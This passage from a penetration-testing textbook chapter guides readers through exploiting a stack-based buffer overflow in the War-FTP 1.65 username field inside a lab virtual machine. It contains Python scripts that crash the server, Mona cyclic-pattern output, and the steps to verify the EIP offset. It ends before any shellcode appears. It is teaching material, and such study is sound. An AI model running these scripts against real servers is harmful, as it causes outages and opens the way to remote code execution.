in the top-left corner of the War-FTP window to put it Figure 17-1: War-
online (see Figure 17-2). FTP icon
searching for a known Vulnerability in war-FtP
A search on Google for known vulnerabilities in War-FTP 1.65 finds the fol-
lowing information on SecurityFocus.com:
War-FTP Username Stack-Based Buffer-Overflow Vulnerability
War-FTP is prone to a stack-based buffer-overflow vulnerability
because it fails to properly check boundaries on user-supplied
data before copying it to an insufficiently sized buffer.
Exploiting this issue could lead to denial-of-service conditions
and to the execution of arbitrary machine code in the context of
the application.
In Chapter 16, we overflowed a function’s local variable on the stack
with supplied input and redirected execution to a memory location of our
choosing. Based on this information from SecurityFocus.com, it looks like we
can do something similar with War-FTP 1.65. In this chapter, we will manu-
ally exploit War-FTP 1.65’s stack-based buffer overflow vulnerability in the
Username field of the FTP login. Now that we are using a real program
rather than demo code, we will learn more about writing real exploits. For
example, this time we won’t be able to simply redirect execution to another
function; we will instead need to introduce instructions to be executed as
part of our attack string.
To get started, make sure War-FTP 1.65 is open and running on your Win-
dows XP virtual machine. (The lightning bolt icon in the top-left corner of the
GUI shown in Figure 17-2 tells the server to listen for incoming connections.)
The issue we are going to exploit is particularly dangerous because
an attacker does not need to log in to the FTP server before launching an
attack. Thus, we do not need to add any legitimate users to the FTP server
for this attack to work.
Before we dive in and start trying to exploit War-FTP, let’s hook it
up to a debugger. Immunity Debugger should be on the desktop of your
Windows XP target because we installed it in Chapter 1. If it is not, follow
the instructions in Chapter 1 for setting up Immunity Debugger and the
Mona plugin. Like GDB, Immunity Debugger will allow us to see the inter-
nals of memory as we attempt to exploit War-FTP. Unfortunately, we don’t
have source code to guide us toward a successful exploit, but by watching
our program in memory as we send it attack strings, we should still be able
to develop a working exploit.
380 Chapter 17
Figure 17-2: War-FTP 1.65 GUI
Start Immunity Debugger, open the File menu, and select Attach. We
want to attach Immunity Debugger to the running War-FTP process, which
we see in the process list in Figure 17-3. Highlight War-FTP 1.65, and click
Attach.
Figure 17-3: Process list in the Immunity Debugger interface
A Stack-Based Buffer Overflow in Windows 381
When Immunity Debugger first attaches to a process, it pauses the pro-
cess’s execution. If at any point your exploit just randomly stops working,
check to make sure the process is running. A paused process isn’t listening
for incoming connections, and, as you can see in the lower-right corner
of the Immunity Debugger window in Figure 17-4, the process is paused.
Click the Play button at the top-left corner of the screen to tell the process
to continue running.
Figure 17-4: War-FTP pauses in Immunity Debugger.
With War-FTP running in Immunity Debugger, we can figure out how
to exploit its buffer overflow vulnerability.
Causing a Crash
In Chapter 19, we will use a technique called fuzzing to look for potential
vulnerabilities in programs, but for now, follow my lead on which attack
strings to use to crash the program. In the Username field of the FTP login,
let’s send a string of 1,100 As instead of a username. Rather than attacking
our program locally, as we did in the previous example, this time we will
382 Chapter 17
create our exploit in Kali Linux and set up the exploit to talk to the FTP
server over the network. Listing 17-1 shows a starter exploit that will cause
the War-FTP program to crash.
note Our exploit examples are written in Python, but they can easily be ported into another
language if you’d prefer to use a different one.
root@kali:~# cat ftpexploit
#!/usr/bin/python
import socket
buffer = "A" * 1100
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) u
connect=s.connect(('192.168.20.10',21)) u
response = s.recv(1024)
print response v
s.send('USER ' + buffer + '\r\n') w
response = s.recv(1024)
print response
s.send('PASS PASSWORD\r\n')
s.close()
Listing 17-1: Python exploit to crash War-FTP
In the exploit shown in Listing 17-1, we first import the socket Python
library. Next, we create a string called buffer, which contains 1,100 As, and
set up a socket at u to connect to our Windows XP machine on port 21,
where the War-FTP server is listening. Next, we accept and print out the
FTP server’s banner to the screen at v. Our exploit then sends over the USER
command with 1,100 As w for the username in hopes of causing the FTP
server to crash.
If the server responds and asks for our password, the exploit is ready
to finish the connection with the password, PASSWORD. However, if our
exploit succeeds, it won’t matter if our credentials are valid, because the
program will crash before it finishes the login process. Finally, we close our
socket, and the exploit finishes. Make sure the Python script is executable
with chmod +x, and run the exploit as shown here.
root@kali:~# chmod +x ftpexploit
root@kali:~# ./ftpexploit
220- Jgaa's Fan Club FTP Service WAR-FTPD 1.65 Ready
220 Please enter your user name.
331 User name okay, Need password.
As with the previous example, we hope to overwrite the saved return
address with a string of As and cause the program to crash. The War-FTP
server sends over its welcome banner, prompts us for our username, and
then asks for a password. Take a look at War-FTP in Immunity Debugger,
as shown in Figure 17-5, to see if our exploit managed to cause a crash.
A Stack-Based Buffer Overflow in Windows 383
Figure 17-5: War-FTP crashes due to a buffer overflow.
After we run our exploit, we see that War-FTP is paused due to an access
violation when attempting to execute an instruction at 41414141. Based on
what we learned in the Linux buffer overflow example in Chapter 16, this
result should seem familiar. A return address was overwritten by our long
string of As, so when the function returned, 41414141 was loaded into the
EIP register. The program attempted to execute the instructions at that
memory location, which was out of bounds and caused a crash.
Locating eiP
As with the previous example, we need to know which four As in our string
are overwriting the return address. Unfortunately, 1,100 As is a bit more
than the 30 we used in the previous chapter, so just counting in memory is
more difficult in this case. Also, we can’t be sure if the first As we’re seeing
on the stack are the first As sent as part of the exploit.
Traditionally, the next step would be to crash the program again with
550 As followed by 550 Bs. If the program crashed with 41414141 in EIP, then
the return address overwrite occurred in the first 550 bytes; if it crashed
with 42424242 in EIP, the overwrite was in the second half. From there, the
half of the string in question would be split into 275 As followed by 275 Bs.
Slowly but surely, this method would narrow down the exact location.
384 Chapter 17
Generating a Cyclical Pattern to Determine Offset
Luckily, we can use Mona to generate a unique cyclic pattern to find the
right four bytes for the return address overwrite in only one iteration. To
use Mona for this task, enter !mona pattern_create with length 1100 as an
argument at the bottom of the Immunity Debugger window, as shown in
Figure 17-6.
Figure 17-6: Using pattern_create in Mona
The 1,100-character cyclic pattern is written to the file C:\logs\war-ftpd\
pattern.txt, as shown in Listing 17-2.
=============================================================================
Output generated by mona.py v2.0, rev 451 - Immunity Debugger
Corelan Team - https://www.corelan.be
=============================================================================
OS : xp, release 5.1.2600
Process being debugged : war-ftpd (pid 2416)
=============================================================================
2015-11-10 11:03:32
=============================================================================
Pattern of 1100 bytes :
-----------------------
A Stack-Based Buffer Overflow in Windows 385
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5
Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1
Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7
Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3
Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9
An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5
Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1
As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7
Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3
Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9
Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5
Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1
Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7
Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3
Bk4Bk5Bk
Listing 17-2: Output of the pattern_create command
We are going to replace the long string of As with the unique pattern
shown in Listing 17-2. But before running the exploit again, we need to
restart War-FTP from the previous crash. In Immunity Debugger, go to
Debug4Restart, and then press the Play button and click the lightning
bolt icon to tell War-FTP to listen on the network. (Follow these steps each
time you need to restart War-FTP after a crash.) Alternatively, you can
close Immunity Debugger, restart War-FTP manually, and attach to the new
process in the debugger. Replace the value of the buffer in the exploit with
the pattern from Listing 17-2, surrounded by quotation marks to make it a
string in Python, as shown in Listing 17-3.
note If War-FTP refuses to restart with the error Unknown format for user database, find
and delete the files FtpDaemon.dat and/or FtpDaemon.ini that were created on the
desktop by War-FTP. This should fix the problem and War-FTP should start normally.
root@kali:~# cat ftpexploit
#!/usr/bin/python
import socket
u buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2
Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8
Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4
Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0
Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6
Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2
Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ap3Ar7Ar8
Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4
Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Ax2Ax3Ax4
Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0
Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7
Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3
Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9
Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5
Bk"
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.20.10',21))
386 Chapter 17
response = s.recv(1024)
print response
s.send('USER ' + buffer + '\r\n')
response = s.recv(1024)
print response
s.send('PASS PASSWORD\r\n')
s.close()
Listing 17-3: Exploit with cyclic pattern
Now run the exploit again with the generated pattern starting at u,
replacing the 1,100 As.
root@kali:~# ./ftpexploit
220- Jgaa's Fan Club FTP Service WAR-FTPD 1.65 Ready
220 Please enter your user name.
331 User name okay, Need password.
Having run our exploit with Metasploit’s pattern, look back at Immunity
Debugger, as shown in Figure 17-7, to see what value is contained in EIP and
to find out where in our attack string we overwrite the return address.
Figure 17-7: Finding the return address overwrite
War-FTP has crashed again, but this time EIP contains four bytes of our
generated pattern: 32714131. We can use Mona to determine where exactly in
A Stack-Based Buffer Overflow in Windows 387
the 1,100-character cyclic pattern the ASCII equivalent of 32714131 is. Enter
!mona pattern_offset 32714131 to get just the offset, or enter !mona findmsp at the
Immunity Debugger prompt, as shown in Figure 17-8, to have Mona perform
additional analysis on all registers and on instances of the pattern in memory.
Figure 17-8: Finding the pattern offsets in Mona
Mona finds instances of the cyclic pattern in memory. The output of
the command is written to C:\logs\war-ftpd\findmsp.txt. Part of the output is
shown here.
EIP contains normal pattern : 0x32714131 (offset 485)
ESP (0x00affd48) points at offset 493 in normal pattern (length 607)
EDI (0x00affe48) points at offset 749 in normal pattern (length 351)
EBP (0x00affda0) points at offset 581 in normal pattern (length 519)
Verifying Offsets
According to Mona, our return address overwrite is 485 bytes into the attack
string. We can verify this, as shown in Listing 17-4.
root@kali:~# cat ftpexploit
#!/usr/bin/python
import socket
388 Chapter 17
u buffer = "A" * 485 + "B" * 4 + "C" * 611
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.20.10',21))
response = s.recv(1024)
print response
s.send('USER ' + buffer + '\r\n')
response = s.recv(1024)
print response
s.send('PASS PASSWORD\r\n')
s.close()
Listing 17-4: Verifying the EIP offset
Now we’ll create an attack string that contains 485 As, 4 Bs, and 611 Cs as
shown at u in Listing 17-4. With our new string in place, if EIP contains
42424242 when the program crashes, we’ll know we have found the correct four
bytes for the return address. (Remember to restart War-FTP in Immunity
Debugger before running the exploit again.) Now, check EIP, as shown in
Figure 17-9.
As expected, War-FTP has crashed again, this time with 42424242 in EIP.
This result confirms that we have found the location of the return address
in our attack string. Next we need to find someplace to redirect execution
and exploit this buffer overflow vulnerability.
Figure 17-9: War-FTP crashes with EIP filled with Bs
A Stack-Based Buffer Overflow in Windows 389
hijacking execution
In the exploit example discussed in Chapter 16, we sent execution to another
function. Unfortunately, because we don’t have the source code of War-FTP
to review for potentially interesting code, we’ll use a more typical technique
for exploit development this time. Instead of redirecting execution to some-
where else in the program, we will introduce our own instructions and
redirect execution to part of our attack string.
First, we need to find out if part of our attack string is easily accessible
at the time of the crash. Look back at the output of the !mona findmsp com-
mand in C:\logs\warftp-d\findmsp.txt, as shown here.
EIP contains normal pattern : 0x32714131 (offset 485)
ESP (0x00affd48) points at offset 493 in normal pattern (length 607)
EDI (0x00affe48) points at offset 749 in normal pattern (length 351)
EBP (0x00affda0) points at offset 581 in normal pattern (length 519)
In addition to taking control of EIP, the registers ESP, EDI, and EBP
also point to part of the attack string. In other words, our attack string
decides the contents of these registers, and there’s nothing to stop us from
replacing the part of the attack string (the Cs in our current crash) with
useful instructions for the CPU to execute.
We can see that ESP is at memory address 00AFFD48, while EBP is slightly